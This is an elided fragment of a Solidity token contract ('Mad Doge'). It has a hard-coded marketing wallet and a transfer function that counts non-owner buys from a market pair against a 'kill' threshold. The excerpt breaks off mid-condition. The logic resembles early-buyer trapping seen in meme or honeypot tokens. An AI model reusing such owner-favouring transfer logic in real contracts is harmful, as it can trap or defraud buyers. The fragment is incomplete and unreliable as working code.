...
contract Localdogcoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Mad Doge";
    string private _symbol = "Mad Doge";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xc05D5AccD9D0876DF81F3fA9Ac96F23869932069);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(recipient != owner() && isMarketPair[sender]){
            counter++;
            if(counter < kill){
